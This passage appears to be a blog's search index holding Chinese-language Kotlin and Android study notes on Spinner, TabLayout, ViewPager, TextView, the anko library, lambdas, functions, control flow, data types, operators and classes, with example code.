//应该是对when-else语句的返回值调用apply方法 }} 使用1234var name:String by SharedPreferencesUtil(this, &quot;name&quot;, &quot;&quot;)var age:Int by SharedPreferencesUtil(this, &quot;age&quot;, 0)var marriage:Boolean by SharedPreferencesUtil(this, &quot;marriage&quot;, true)//以上三个变量就被“本地化”保存了","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SharedPreference/"},{"title":"Kotlin学习笔记——Spinner","text":"android提供的spinner1234567891011121314151617181920212223class MainActivity : AppCompatActivity() { val strs = arrayOf(&quot;1&quot;, &quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;, &quot;6&quot;, &quot;7&quot;,&quot;8&quot;,&quot;9&quot;,&quot;10&quot;,&quot;11&quot;,&quot;12&quot;,&quot;13&quot;,&quot;14&quot;,&quot;15&quot;,&quot;16&quot;) override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) val sp = findViewById&lt;View&gt;(R.id.spinner) as Spinner val startAdapter = ArrayAdapter(this, R.layout.support_simple_spinner_dropdown_item, strs) startAdapter.setDropDownViewResource(R.layout.support_simple_spinner_dropdown_item) sp.prompt = &quot;请选择&quot; sp.adapter = startAdapter sp.setSelection(0) var listen = myItemClickListener() sp.onItemSelectedListener = listen } internal inner class myItemClickListener : AdapterView.OnItemSelectedListener { override fun onNothingSelected(parent: AdapterView&lt;*&gt;?) { } override fun onItemSelected(parent: AdapterView&lt;*&gt;?, view: View?, position: Int, id: Long) { toast(&quot;你的选择是：${strs[position]}&quot;) } }} 步骤 一个ArrayAdapter，参数分别是this，R.layout.support_simple_spinner_dropdown_item，Array&lt;String&gt;（到时候的item） 刚才的ArrayAdapter设置效率视窗资源，调用setDropDownViewResource函数，参数是R.layout.support_simple_spinner_dropdown_item 把ArrayAdapter赋值给spinner的adapter成员 设置默认选项，setSelection 如果想让spinner为对话框形式的，在xml文件中设置android:spinnerMode=&quot;Dialog&quot;,spinner的prompt成员为设置对话框标题的接口 新建一个内部类，监听下拉选择，继承AdapterView.OnItemSelectedListener，重载onNothingSelected和onItemSelected两个方法 新建监听器对象，通过spinner的onItemSelectedListener设置为监听器 anko库提供的spinner——selector1234567val strs = Arrayof(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;)aTextView.text = &quot;假装这是一个spinner，其实我是TextView&quot;aTextView.setOnClickListener { selector(&quot;请选择&quot;, strs) { i -&gt; toast(&quot;你的选择是：${strs[i]}&quot;) }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Spinner/"},{"title":"Kotlin学习笔记——TabLayout","text":"1#define 小毛驴 xml 使用场景如果想让ViewPager的tab标签和Toolbar合二为一的话，可以在Toolbar中嵌套TabLayout 使用方法 编写好小毛驴文件，把TabLayout嵌套到Toolbar中，编写好每一页的小毛驴布局文件，写好传递数据的类 编写Fragment1234567891011121314151617181920212223242526272829303132333435363738class BlankFragment : Fragment() { var ctx:Context? = null var mPosition:Int = 0 var mInageId:Int = 0 var mDesc:String = &quot;&quot; var title:String = &quot;&quot; override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? { ctx = activity if (arguments != null) { mPosition = arguments!!.getInt(&quot;position&quot;, 0) mInageId = arguments!!.getInt(&quot;image_id&quot;, 0) mDesc = arguments!!.getString(&quot;desc&quot;) title = arguments!!.getString(&quot;title&quot;) } val view = inflater.inflate(R.layout.item, container, false) val pic:ImageView = view.findViewById(R.id.imageView) val desc:TextView = view.findViewById(R.id.textView) pic.setImageResource(mInageId) desc.text = mDesc return view } companion object { fun newInstance(position:Int, image_id:Int, desc:String, title:String) : BlankFragment { val fragment = BlankFragment() val bundle = Bundle() bundle.putInt(&quot;position&quot;, position) bundle.putInt(&quot;image_id&quot;, image_id) bundle.putString(&quot;desc&quot;, desc) bundle.putString(&quot;title&quot;, title) fragment.arguments = bundle return fragment } }} 编写ViewPager的适配器1234567891011class infoPagerAdapter(val fragManger: FragmentManager, val itemList:MutableList&lt;itemInfo&gt;) : FragmentStatePagerAdapter(fragManger) { override fun getCount(): Int = itemList.size override fun getItem(p0: Int): Fragment { val item = itemList[p0] return BlankFragment.newInstance(p0, item.pic, item.desc, item.name) } override fun getPageTitle(position: Int): CharSequence? { return itemList[position].name }} 给ViewPager添加适配器12345678910111213141516171819202122232425262728293031323334353637383940class the_pics : AppCompatActivity() , TabLayout.OnTabSelectedListener { override fun onTabReselected(p0: TabLayout.Tab?) {} override fun onTabUnselected(p0: TabLayout.Tab?) { } override fun onTabSelected(p0: TabLayout.Tab?) { if (p0 != null) vp.currentItem = p0.position //如果用户点击了某个标签，把下面ViewPager也滚动到相应位置 //以上三个重载函数都是Toolbar上的标签产生事件后相应的操作 } override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_the_pics) val bar:android.support.v7.widget.Toolbar = findViewById(R.id.bar) setSupportActionBar(bar) supportActionBar?.title = &quot;&quot; bar.setNavigationOnClickListener { setResult(Activity.RESULT_OK) finish() }//设置Toolbar的返回导航键的click监听器 var data:MutableList&lt;itemInfo&gt; = mutableListOf() /*省略data的赋值过程*/ tab_title.addOnTabSelectedListener(this) vp.adapter = infoPagerAdapter(supportFragmentManager, data) vp.addOnPageChangeListener(object : ViewPager.SimpleOnPageChangeListener() { override fun onPageSelected(position: Int) { tab_title.getTabAt(position)!!.select()//让标签栏的第position个变成被选择状态 //这个重载函数是ViewPager上有Page的改变后调用的函数 } }) }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94TabLayout/"},{"title":"Kotlin学习笔记——TextView","text":"文本属性设置函数 方法 说明 备注 text 当前文本内容 可以直接赋值，更改内容，可以当做变量，获取内容 textSize 文本大小 Float类型 setTextColor 设置文本颜色 与Color类一起使用 setBackgroundColor 设置背景色 与Color类一起使用 gravity 设置对齐方式 与Gravity一起使用，多种对齐方式用or连接 ellipsize 多余文本的省略方式 与TruncateAt一起使用 setSingleLine 是否单行显示 参数Boolean isFocusable 是否可获得焦点 可赋值，更改属性，可以取值 isFocusableInTouchMode 是否在触摸时获得焦点 可赋值，更改属性，可以取值 补充ColorColor类中的常用静态成员 名称 参数 作用 rgb 三个r、g、b值 返回一个对应rgb的Color对象 其他静态成员常量 无 yellow、green、red、grey等对应颜色的Color对象 GravityColor类中的常用静态成员 名称 作用 LEFT 左对齐 RIGHT 右对齐 CENTER 居中 TruncateAtColor类中的常用静态成员 名称 作用 START 省略号在开头 MIDDLE 省略号在中间 END 省略号在末尾 MARQUEE 跑马灯显示，一定要设置为单行显示 特定效果跑马灯显示，自动滚动，不需要获得焦点 重载isFocused函数，让其永远返回true，默认一直在获得焦点 设置单行显示 设置Focusable12345678910111213141516class MyTextView : TextView { init { this.gravity = Gravity.LEFT or Gravity.CENTER this.ellipsize = TextUtils.TruncateAt.MARQUEE this.setSingleLine(true) this.isFocusable = true this.isFocusableInTouchMode = true } constructor(context: Context) : super(context) constructor(context: Context, attrs: AttributeSet?) : super(context, attrs) constructor(context: Context, attrs: AttributeSet?, style: Int) : super(context, attrs, style) override fun isFocused(): Boolean { return true }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94TextView/"},{"title":"Kotlin学习笔记——ViewPager","text":"1#define 小毛驴 xml 使用方法 在活动页面添加ViewPager，如果需要tab标签，在ViewPager里嵌套PagerTabStrip或PagerTitleStrip 设计传送数据的类（一张图和一个标题就足够） 编写ViewPager的适配器12345678910111213141516171819202122232425262728293031class ImagePagerAdapter(val context: Context, val itemList:MutableList&lt;itemInfo&gt;) : PagerAdapter() { val views = mutableListOf&lt;ImageView&gt;() init { for (item in itemList) { val view = ImageView(context) //view.layoutParams = ActionBar.LayoutParams(ActionBar.LayoutParams.MATCH_PARENT, ActionBar.LayoutParams.WRAP_CONTENT) view.layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT) view.setImageResource(item.pic) view.scaleType = ImageView.ScaleType.FIT_CENTER views.add(view) } } override fun isViewFromObject(p0: View, p1: Any): Boolean = (p0 === p1) override fun getCount(): Int = views.size override fun destroyItem(container: ViewGroup, position: Int, `object`: Any) { container.removeView(views[position]) } override fun instantiateItem(container: ViewGroup, position: Int): Any { container.addView(views[position]) return views[position] } override fun getPageTitle(position: Int): CharSequence? { return itemList[position].desc }//与PagerTabStrip或配合使用} 给PagerView添加适配器和页面改变的Listener123456789101112131415161718192021222324252627282930313233class MainActivity : AppCompatActivity(), ViewPager.OnPageChangeListener { override fun onPageScrollStateChanged(p0: Int) { } override fun onPageScrolled(p0: Int, p1: Float, p2: Int) { } override fun onPageSelected(p0: Int) { Toast.makeText(this, p0.toString(), Toast.LENGTH_SHORT).show() } override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) //supportActionBar?.hide() var vp:ViewPager = findViewById(R.id.vp) val pics = arrayOf(R.mipmap.basic, R.mipmap.close, R.mipmap.debug, R.mipmap.edit) val list:MutableList&lt;itemInfo&gt; = mutableListOf() for (i in pics.indices) { list.add(itemInfo((i+1).toString(), pics[i])) } vp.adapter = ImagePagerAdapter(this, list) vp.currentItem = 0 vp.addOnPageChangeListener(this) var title: PagerTabStrip = findViewById(R.id.title) title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20f) title.setTextColor(Color.RED) }}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94ViewPager/"},{"title":"Kotlin学习笔记——anko库","text":"弹出吐司 方法 参数 解释 备注 toast CharSequence 弹出短吐司 相当于Toast.makeText(this, &quot;String&quot;, Toast.Toast.LENGTH_SHORT).show() longToast CharSequence 弹出长吐司 相当于Toast.makeText(this, &quot;String&quot;, Toast.Toast.LENGTH_LONG).show() 像素转换方法 方法 说明 dip dip 转 px sp sp 转 px px2dip px 转 dip px2sp px 转 sp dimen dip 转 sp 弹出警告窗口12345678alert(&quot;对话框内容&quot;, &quot;对话框标题&quot;) { positiveButton(&quot;确认&quot;) { //点按确认后执行的操作 } negativeButton(&quot;取消&quot;) { //点按取消后执行的操作 }}.show()","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94anko%E5%BA%93/"},{"title":"Kotlin学习笔记——lambda","text":"参考文献——kotlin之Lambda编程来自简书作者——程自舟 Kotlin lambda语法12345678910111213btn.setOnClickListener ((View v) -&gt; { toast(&quot;click&quot;)})btn.setOnclickListener { toast(&quot;click&quot;)}btn.setOnLongClickListener { toast(&quot;Long Click&quot;) true//lambdda的返回值，不写return}{a:Int, b:String -&gt; String (a + b.toDouble()).toString()} 完整写法123456789{a:Int, b:String, c:Long/*输入参数列表*/ -&gt; String/*返回值类型*/ /*lambda body*/ var temp:Double = a + b.toDouble() if (c == 0L) { &quot;error&quot; } else { (temp.toDouble() + c).toString() }//返回值(不要写return)} 省略参数的写法12345{ /* lambda body */} lambda的使用 作为高阶函数的参数，比如setOnclickListener，List的sort系列函数 调用run方法1run { toast(&quot;run&quot;) } Lambda表达式也可以传递给一个高阶函数当做参数,因此上述代码中1view.setOnClickListener({v -&gt; viewClicked(v) }) 在 Kotlin 中有一个约定，如果函数的最后一个参数是一个函数，并且你传递一个 lambda 表达式作为相应的参数，你可以在圆括号之外指定它因此可以实现如下1view.setOnClickListener() {v -&gt; viewClicked(v) } 在 Kotlin中还有另外一个约定，如果一个函数的参数只有一个，并且参数也是一个函数，那么可以省略圆括号1view.setOnClickListener{v -&gt; viewClicked(v) } 使用默认参数名称（注意）12//使用默认参数名称people.maxBy { it.age} //&quot;it&quot;是自动生成的参数名称 默认名称it只会在实参名称没有显示的指定时候才会生成。it能大大缩短简化代码，但是不应该滥用，尤其是在lambda嵌套情况下，最好显示声明lambda参数。否则很难搞清it引用的到底是哪个值，本末倒置。","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94lambda/"},{"title":"Kotlin学习笔记——基础语法篇之函数","text":"函数的一般形式12345fun mathodName(/*para list*/) : String/*return value type*/ { /* function body */} 与C、C++或java的不同 如果要重载，在fun前面加override 如果想让子类重载，要加open关键词（类也一样） 可以定义全局函数，函数不是必须写在类里 可以有默认参数，且默认参数不必放在最后几个123456789101112fun TextView.println(str:CharSequence) { append(&quot;\\n${str}&quot;)}fun TextView.print(str:CharSequence) { append(str)}//这个东西是扩展函数，后面说fun func(str:String = &quot;哈哈哈&quot;,i:Int, j:Double) {//str的默认参数&quot;哈哈哈&quot; val text:TextView = findViewById(R.id.text) text.print(&quot;$str&quot;) text.println(&quot;$i&quot;) text.println(&quot;$j&quot;)} 此时，在调用时，如果第一个不采用默认参数，则按照顺序传递三个参数，否则按照以下形式传递参数1func(i = 10, j = 20.5) 可变参数，在参数列表中，参数名称前用vararg（var = varable, arg = 参数）修饰1234567fun appendString(tag:String, vararg info:String?) : String { var str:String = &quot;${tag}&quot; for (item in info) { str = &quot;${str}\\n${item}&quot; } return str} Kotlin的特殊函数泛型函数/内联函数例子1234567fun&lt;T&gt; appendString(tag:String, vararg info:T?) : String { var str:String = &quot;${tag}&quot; for (item in info) { str = &quot;${str}\\n${item.toString()}&quot; } return str} 在fun后面加入&lt;泛型列表&gt;,表示泛型函数 调用方法123btn.setOnClickListener { text.text = appendString&lt;Int&gt;(&quot;转化&quot;, 1,2,3,4,5,6,7,8,9)} 注意 只有泛型类才拥有成员泛型函数，或者可以把泛型函数作为全局函数 Kotlin是强类型的语言，如果需要即传递Number类继承的类对象，而不继承其他类对象，不能写&lt;Number&gt; 要写成&lt;reified T : Number&gt;,这个写法等价于java的&lt;T extends Number&gt; 简化函数Kotlin中，函数的定义形式和变量十分相似，这是因为函数也是一种特殊变量，可以对他赋值 例子1fun factorial(n:Int):Int = if(n &lt;= 1) n else n*factorial(n-1) 尾递归函数在fun之前加上关键字tailrec(tail——尾巴，rec——不知道)，告诉编译器这是一个尾递归函数，编译器可以自动优化成循环 例子12tailrec fun findFixPoint(x:Double = 1.0) : Double = if (x == Math.cos(x)) x else findFixPoint(Math.cos(x)) 高阶函数传入的参数是一个函数，个人认为相当于C/C++的函数指针，或者说传递了一个函数变量 例子1234567891011121314fun&lt;T&gt; maxCustom(array:Array&lt;T&gt;, greater:(T,T) -&gt; Boolean) : T? { /* 这个地方 greater(T, T) -&gt; Boolean 表示一个函数名为greater，参数为两个T类型，返回值的Boolean的函数 */ var max:T? = null for (item in array) { if (max == null || greater(item, max)) { max = item } } return max} 调用1234val arr:Array&lt;Int&gt; = arrayOf(1,2,3)btn.setOnClickListener { text.text = &quot;最大值为${maxCustom&lt;Int&gt;(arr, {a,b -&gt; a &gt; b}).toString()}&quot;}//使用lambad表达式 系统增强函数扩展函数可以给已有的类中添加函数，作为成员函数 例子123456fun TextView.println(str:CharSequence) { append(&quot;${str}\\n&quot;)}fun TextView.print(str:CharSequence) { append(str)} 调用和正常成员函数一样调用 123456val text:TextView = findViewById(R.id.text)val btn:Button = findViewById(R.id.btn)btn.setOnClickListener { text.println(&quot;123&quot;) text.print(&quot;demo&quot;)} 单例对象用object替换class，这样其中的所有函数都是静态成员函数了 相当于static修饰符","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%AF%87%E4%B9%8B%E5%87%BD%E6%95%B0/"},{"title":"Kotlin学习笔记——基础语法篇之控制语句","text":"if…else…用法Kotlin中if...else...基本用法与C/C++，java中相同 例子12345678button.setOnClickListener { if (flag) { text.text = &quot;I love you, at the first sight of you.&quot; } else { text.text = &quot;I love three things in this world.Sun, moon and you. &quot; + &quot;Sun for morning, moon for night, and you forever.&quot; }} 而Kotlin的if else可以有返回值 例子12345678button.setOnClickListener { text.text = if (flag) { &quot;I love you, at the first sight of you.&quot; } else { &quot;I love three things in this world.Sun, moon and you. &quot; + &quot;Sun for morning, moon for night, and you forever.&quot; }} Kotlin中没有java，C/C++的三目运算符，但是可以用if…else…取代 例子1234567button.setOnClickListener { text.text = if (flag) (16).toString() else (153.6).toString() /* 像极了三目元算符：(假装这里是C/C++或java) text.text = flag ? (16).toString() : (153.6).toString(); */} when…else…用法Kotlin中的when...else...多路分支相当于C/C++，java中的switch...case...，但是用法稍有不同 Kotlin的when...else...和Kotlin的if...else...一样，允许有返回值 Kotlin的when...else...各个分支中，可以不是常量，变量也可以 Kotlin的when...else...不用写break，每个分支结束后自动退出when...else...语句块 例子123456789button.setOnClickListener { text.text = when(type) { 1,2,3 -&gt; &quot;I love you, at the first sight of you.&quot;//多个值走同一个分支，用逗号隔开 in 4..10 -&gt; &quot;I love three things in this world.Sun, moon and you. &quot; + &quot;Sun for morning, moon for night, and you forever.&quot;//表示在4到10之间 !in 1..10 -&gt; &quot;We don't talk anymore.&quot;//表示不在1到10之间 else -&gt; &quot;error&quot; }} 循环for循环Kotlin居然取消了常见的for循环，tmd 遍历循环1. for-in循环类似C++/java中的for_each形式的循环，可以对字符串、数组、Array&lt;&gt;, 队列、映射、集合进行遍历 例子123456btn.setOnClickListener { var str:String = &quot;0123456789&quot; for (item in str) {//item自动类型推断 Toast.makeText(this, &quot;${item}&quot;, Toast.Toast.LENGTH_SHORT).show() }} 例子(下标数组遍历)123456btn.setOnClickListener { var str:String = &quot;0123456789&quot; for (i in str.indices) {//indices是下标数组 Toast.makeText(this, &quot;${str[i]}&quot;, Toast.Toast.LENGTH_SHORT).show() }} 条件循环格式123456for(i in 11 until 66) {}//左闭右开区间，[11,66)for (i in 23..89 step 4) {}//每次循环，i += 4，如果条件允许，可以到89for (i in 50 downTo 7) {}//从50 递减到 7 while循环用法同java/C/C++ do-while循环用法同java/C/C++ 跳出多重循环和java类似，如果想一次性跳出多个循环，可以在循环外面加”标签” 例子123456789101112var i:Int = 0var j:Int = 0@outside while (i &lt;= 10) { j = 10; while (i * j != 50) { j-- if (j == 0) { break@outside } } i++}","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%AF%87%E4%B9%8B%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/"},{"title":"Kotlin学习笔记——基础语法篇之数据类型","text":"一、基本数据类型Kotlin的数据类型 数据类型名称 Kotlin的数据类型 整型 Int 长整型 Long 浮点型 Float 双精度浮点型 Double 布尔型 Boolean 声明变量1234567891011var integer:Int//一般用法var/val + 标识符 + : + 类型名，var表示变量val integer1:Int = 0//val表示常量，相当于java中的final，c++中的constvar str = &quot;this is a string&quot;//没有&quot;:String&quot;，此时只要保证编译器可以知道变量的类型，则编译器可以完成类型推断var flt:Float = 5f//f表示数据为float类型var tobar:Toolbar? = findViewById&lt;Toolbar&gt;(R.id.toolbar)/*类型名后+'?'表示该变量为可空变量，kotlin为了防止java中NullPointerException，默认所有的变量都是不可空（不能为null的），如果要让变量为空，需要+'?'，此时，编译器会强制程序员对所有可空变量进行非空判断*/ Kotlin的类型转换强制类型转换12var double:Double = 16.0val dbl2Int:Int = (double as Int) 数据转换函数在kotlin的世界中，一切都是类和对象，基本数据类型也是，其中用于数据转换的成员函数 Kotlin的数据类型转换函数 toInt toLong toFloat toDouble toChar toString 二、字符串字符串与其他基本数据类型转换 String的成员函数 备注 toInt toLong toFloat toDouble toBoolean toCharArray 返回的是CharArray不是Array&lt;Char&gt; 字符串的常用方法 String的成员函数 解释 indexOf 查找子串 substring 获取子串 replace 替换子串 split 按特定字符分隔子串，返回值是List&lt;String&gt; 字符串拼接12345678val str1:String = &quot;我刘景天宇宙第一帅！&quot;val integer:Int = 8848val text:TextView = findViewById&lt;TextView&gt;(R.id.text)val strCat:String = &quot;str1 = ${str1} integer = $integer, 当前text中显示的内容是：${text.text}&quot;/*$变量名${表达式}*/ 三、数组Kotlin的数组类型 数组名称 初始化方法 数组名称 初始化方法 IntArray intArrayOf Array&lt;Int&gt; ArrayOf LongArray longArrayOf Array&lt;Long&gt; ArrayOf FloatArray floatArrayOf Array&lt;Float&gt; ArrayOf DoubleArray doubleArrayOf Array&lt;Double&gt; ArrayOf BooleanArray booleanArrayOf Array&lt;Boolean&gt; ArrayOf CharArray charArrayOf Array&lt;Char&gt; ArrayOf null null Array&lt;String&gt; ArrayOf 数组常用方法 成员 解释 size 数组长度 get(index) 获取元素 set(index, value) 修改元素值 ps:kotlin也可以通过下标引用元素和修改元素 四、容器Kotlin的容器 Kotlin容器 名称 初始化方法 只读集合 Set setOf 可变集合 MutableSet mutableSetOf 只读队列 Set listOf 可变队列 MutableSet mutableListOf 只读映射 Set mapOf 可变映射 MutableSet mutableMapOf 容器的通用常用方法 方法名 返回值 解释 isEmpty() Boolean 判断是否为空 isNotEmpty() Boolean 判断是否为非空 clear() Unit（猜测） 清空容器（找不到这个方法） contains(value) Boolean 查找有没有这个元素 iterator() 对应的迭代器 返回容器的迭代器 count() Int 获取元素个数 size Int 获取元素个数 ps:只读容器初始化后就不可更改了 容器的迭代器的常用方法 方法名 解释 hasNext() 类似java的Scanner的hasNext方法 next() 类似java的Scanner的Next方法 集合Kotlin集合的特性 集合内部元素不按照顺序排列，无法下标访问 集合内部元素具有唯一性 MutableSet的元素变更方法 方法 解释 add(element) 添加元素 remove(element) 移除某个元素 映射初始化方法123456var map1:map&lt;String, int&gt; = mapOf(&quot;1&quot; to 1, &quot;2&quot; to 2, &quot;3&quot; to 3)var map2:mutableMap&lt;String, Boolean&gt; = mutableMapOf(Pair(&quot;a&quot;, true), Pair(&quot;b&quot;, false))/*不论是map还是mutableMap，都可以使用 key to value和Pair(Key, Value)*/ Map和MutableMap的常用方法 方法 返回值 解释 Map MutableMap containsKey(key) Boolean 判断是否有指定键的元素 √ √ containsValue(value) Boolean 判断是否有指定值的元素 √ √ put(key, value) String? 添加元素 × √ remove(key) String? 移除元素 × √ remove(key， value) Boolean 移除元素 × √ 队列队列的常用方法 方法 返回值 解释 List MutableList get(index) ElementType 返回对应位置的元素 √ √ [index] ElementType 下标运算 √ √ add(element) Unit 向队尾添加元素 × √ set(index, element) ElementType 修改指定位置的元素 × √ removeAt(index) Int 移除指定位置的元素 × √ sortBy{排序条件} Unit 按照排序条件升序排列 × √ sortByDescending{排序条件} Unit 按照排序条件降序排列 × √ sort() Unit 排序 × √ 五、类型判断例子12345if (varable is String) { //Do something，} else if (varable is Int) { //or you will do something} 例子12345when (varable) { is String -&gt; //Do something is Int -&gt; //or you will do something else -&gt; //nothing} 六、空安全1234567891011121314var i:Int = 0//Kotlin默认的变量是不可为空(null)的var str:String? = null//如果想让一个变量为空，要在类型名后面加'?'i = str?.length //可空变量在调用方法时，在后面加上'?'，一旦可空变量str的值为空，返回nulltry { i = str!!.length} catch(e: Exception) { Toast.makeText(this, &quot;遇到${e}错误&quot;, Toast.LENGTH_SHORT).show()}//可空变量加!!，表示如果为空，抛出异常i = str?.length : -1//表示如果str为空，则值为0","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%AF%87%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"},{"title":"Kotlin学习笔记——基础语法篇之特殊运算符","text":"参考文献——Kotlin学习之运算符来自简书作者——Hunter_Arley 等值判断 运算符 解释 重载函数 a == b 判断ab是否结构相等，相当于java中a.equals(b)或b.equals(a) a?.equals(b)?:b===null a != b 判断ab是否结构不等，相当于java中!a.equals(b)或!b.equals(a) !(a?.equals(b)？:b===null) === 判断是否结构相等且引用相同 ps: Kotlin中的==用来比较两个元素是否相同，比如字符串的内容，整数，浮点数的值，而不比较引用是否相同，而===表示比较内容是否相同，且引用是否相同 新增运算符 运算符 解释 重载函数 is 判断变量是否为某个类型 a in b 检查元素a是否在b中 b.contains(a) 下标运算符 操作符 函数 a[i] a.get(i) a[i,j] a.get(i,j) a[i_1,…,i_n] a.get(i_1,…,i_n) a[i]=b a.set(i,b) a[i,j]=b a.set(i,j,b) a[i_1,…,i_n]=b a.set(i_1,…,i_n,b) 与Java不同，Kotlin的这个运算符不仅可以用在数组变量后，也可以用在集合变量后，可以方便地调用和操作数组和集合中的元素。 位、逻辑运算符 Java位运算符 Kotlin Kotlin函数 描述 ~a 无 a.inv() 按位取非 a&amp;b a and b a.and(b) 按位与 a | b a or b a.or(b) 按位或 a^b a xor b a.xor(b) 按位异或 a&lt;&lt; b a shl b a.shl(b) 左移b位 a&gt;&gt;b a shr b a.shr(b) 右移b位 a&gt;&gt;&gt;b a ushr b a.ushr(b) 无符号右移b位","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%AF%87%E4%B9%8B%E7%89%B9%E6%AE%8A%E8%BF%90%E7%AE%97%E7%AC%A6/"},{"title":"Kotlin学习笔记——基础语法篇之类和对象","text":"类的构造Kotlin类的写法 Kotlin类的构造函数分为主构造函数和二级构造函数 主构造函数的特点——函数名为init，参数要写在类名后面（下面举例），一般用于初始化 如果要在java中调用kotlin的类，要在类名前面加上@JvmOverloads（让java能够识别默认参数），并且补充constructor关键字 主构造函数的参数写在类名后，如果没有@JvmOverloads修饰，constructor关键字可省略（不是指二级构造函数的constructor，是类名后面的） 二级构造函数用constructor关键字 二级构造函数的特点——可有可无，相互独立，如果有主构造函数，先调用主构造函数 例子123456789101112131415161718class Animal (type:String = &quot;动物&quot;, name:String) { //没有@JvmOverloads修饰，可以省略constructor //等价以下写法//class Animal constructor(type:String = &quot;动物&quot;, name:String) { var Type:String = &quot;&quot; var Name:String = &quot;&quot; var Age:Int = 0 var Sex:String = &quot;&quot; init { Type = type Name = name } constructor(type:String = &quot;动物&quot;, name:String, age:Int, sex:String) : this(type, name){ Age = age Sex = sex }} 类的成员类的成员属性观察上述代码，构造函数传入的参数和成员变量一一对应，对于这些变量，Kotlin提供简便写法，在参数名之前加上val或var 例子1234567891011class Animal (var type:String = &quot;动物&quot;, var name:String) { //只有主构造函数中才可以有成员属性 var sex:Int = 0 var age = 0 constructor(type:String = &quot;动物&quot;, name:String, age:Int, sex:Int) : this(type, name){ this.sex = sex this.age = age }}//到时候可以直接调用成员变量type，name等 伴生对象和静态属性想要让类具有类似java中静态成员函数和静态成员变量，要用到伴生对象，相当于java中的static代码块儿 例子1234567891011121314151617181920212223class Animal (var type:String = &quot;动物&quot;, var name:String) { var sex:Int = 0 var age = 0 constructor(type:String = &quot;动物&quot;, name:String, age:Int, sex:Int) : this(type, name){ this.sex = sex this.age = age } companion object StaticMembers { val MALE:Int = 0 val FEMALE:Int = 1 val UNKNOWNSEX:Int = 2 val UNDIFINEDSEX:Int = 3 fun sexToString(sex:Int):String { return when(sex) { MALE -&gt; &quot;Male&quot; FEMALE -&gt; &quot;Female&quot; UNKNOWNSEX -&gt; &quot;UnKnownSex&quot; UNDIFINEDSEX -&gt; &quot;UnDefindSex&quot; else -&gt; &quot;Invalid input&quot; } } }} 类的继承在Kotlin中，默认情况下，类是不允许被继承的，成员函数也是不允许重写的，只有加上open修饰符，被修饰的类才可以被继承，被修饰的函数才可以被重写，Kotlin的类和函数默认相当于java的final类和方法 Kotlin中的开放性修饰符 开放性修饰符 说明 public 对所有人开放，Kotlin的类、函数变量不加修饰全部都是public internal 对于本模块开放 protected 对于自己和子类开放 private 私有，不能和open一起使用 抽象类写法： 123abstract class demo() { abstract fun func1():Int} 接口123456interface interDemo { fun func1():String fun func2():String { return &quot;I'm tired&quot; }} 注意 Kotlin不允许多继承，通过接口来间接实现多继承 抽象类不能定义对象 kotlin允许在接口内部实现某个方法 接口内部的所有方法默认都是open类型默认是抽象的 继承的时候，基类的成员属性不用加val或var 几种特殊的类嵌套类注意 嵌套类就是在类里面再写一个类 普通的嵌套类不能访问外部类的数据 例子1234567class outerClass(var otrName:String = &quot;outer name&quot;) { class innerClass(var inrName:String = &quot;inner name&quot;) { fun getInfo():String { return &quot;我的名字是：${inrName}&quot; } }} 内部类 可以访问外部类数据的嵌套类1234567class outerClass(var otrName:String = 